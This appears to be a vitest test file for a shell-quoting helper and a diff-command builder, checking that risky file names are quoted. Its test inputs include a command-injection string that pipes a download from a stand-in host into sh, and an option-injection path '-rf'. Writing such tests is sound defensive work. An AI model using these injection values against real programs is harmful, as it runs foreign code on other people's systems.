import { describe, expect, it } from "vitest";
import { diffCommand, shellWord } from "./shell";

describe("a word for the shell", () => {
  it("stays as it is when it is plain", () => {
    expect(shellWord("src/lib/a-b_c.v2.ts")).toBe("src/lib/a-b_c.v2.ts");
    expect(shellWord("web#12")).toBe("'web#12'");
  });

  it("goes in single quotes when anything in it means something to a shell", () => {
    for (const hostile of [
      "a;{curl,-s,evil.sh}|sh",
      "a(1).txt",
      "x|y",
      "*.c",
      "~/x",
      "#x",
      "a b",
      "a$b",
      "a`b`",
      "!x",
      "a\nb",
    ]) {
      const word = shellWord(hostile);
      expect(word.startsWith("'") && word.endsWith("'"), hostile).toBe(true);
    }
    expect(shellWord("it's")).toBe("'it'\\''s'");
  });
});

describe("fctl diff's command for a file", () => {
  it("names the session, the repository and the file, each one word", () => {
    expect(diffCommand("web#12", "src/a.rs")).toBe("fctl diff 'web#12' src/a.rs");
    expect(diffCommand("web#12", "docs/a b.md", "acme/docs")).toBe(
      "fctl diff 'web#12' --repo acme/docs 'docs/a b.md'",
    );
  });

  it("puts a path that looks like an option after --", () => {
    expect(diffCommand("web#12", "-rf")).toBe("fctl diff 'web#12' -- -rf");
  });
});
